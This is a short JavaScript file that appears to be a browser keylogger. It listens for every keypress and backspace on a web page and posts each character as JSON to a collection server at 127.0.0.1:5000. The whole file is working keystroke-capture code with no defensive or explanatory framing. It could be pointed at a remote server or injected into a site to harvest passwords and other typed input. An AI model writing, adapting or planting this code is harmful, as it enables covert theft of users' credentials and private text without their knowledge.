document.querySelector("html").addEventListener("keypress", e => {
	if (e.which === 32) {
		const data = {
			key: "<space>"
		}
		fetch("http://127.0.0.1:5000/", {
			method: "POST",
			mode: "cors",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		}).then(res => {
			console.log("<space>");
		})
		.catch(error => {
			console.error("Fetch error", error);
		})
	} else if (e.which === 13) {
		const data = {
			key: "<enter>"
		}
		fetch("http://127.0.0.1:5000/", {
			method: "POST",
			mode: "cors",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		}).then(res => {
			console.log("<enter>"); 
		})
		.catch(error => {
			console.error("Fetch error", error);
		})
	} else {
		const data = {
			key: String.fromCharCode(e.which)
		}
		fetch("http://127.0.0.1:5000/", {
			method: "POST",
			mode: "cors",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		}).then(res => {
			console.log(String.fromCharCode(e.which));
		})
		.catch(error => {
			console.error("Fetch error", error);
		})
	}
});

document.querySelector("html").addEventListener("keydown", e => {
	if (e.keyCode === 8) {
		const data = {
			key: String.fromCharCode(e.which)
		}
		fetch("http://127.0.0.1:5000/", {
			method: "POST",
			mode: "cors",
			headers: {
				"Content-Type": "application/json"
			},
			body: JSON.stringify(data)
		}).then(res => {
			console.log("<backspace>");
		})
		.catch(error => {
			console.error("Fetch error", error);
		})
	}
});

